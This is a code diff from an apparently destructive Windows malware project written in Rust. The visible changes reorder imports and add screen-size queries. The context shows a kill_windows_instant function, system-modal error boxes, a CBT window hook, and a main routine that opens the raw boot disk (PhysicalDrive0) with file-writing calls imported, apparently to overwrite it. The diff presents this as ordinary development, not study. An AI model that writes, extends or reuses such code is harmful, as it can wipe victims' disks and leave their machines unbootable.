@@ -23,18 +23,23 @@ use std::{
     thread::{self, sleep},
     time::Duration,
 };
-use windows::{Win32::{
-    Foundation::{
-        GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND, LPARAM, LRESULT,
-        NTSTATUS, WPARAM,
+use windows::{
+    core::PCSTR,
+    Win32::{
+        Foundation::{
+            GetLastError, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND, LPARAM, LRESULT,
+            NTSTATUS, WPARAM,
+        },
+        Graphics::Gdi::HFONT,
+        Storage::FileSystem::{
+            WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
+            FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
+        },
+        UI::WindowsAndMessaging::{
+            MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, SM_CXSCREEN, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
+        },
     },
-    Graphics::Gdi::HFONT,
-    Storage::FileSystem::{
-        WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
-        FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
-    },
-    UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT, SW_SHOWDEFAULT},
-}, core::PCSTR};
+};
 
 struct Clean {
     main_window: HWND,
@@ -113,7 +118,10 @@ fn kill_windows_instant() -> Result<(), WinError> {
 
 fn main() -> Result<(), WinError> {
     log::new_log();
-    let _res = Resolution::default();
+    let (scrw, scrh) = (
+        wrap_get_system_metrics(SM_CXSCREEN)?,
+        wrap_get_system_metrics(SM_CYSCREEN)?,
+    );
 
     let drive = wrap_create_file_a(
         *"\\\\.\\PhysicalDrive0".to_pcstr(),
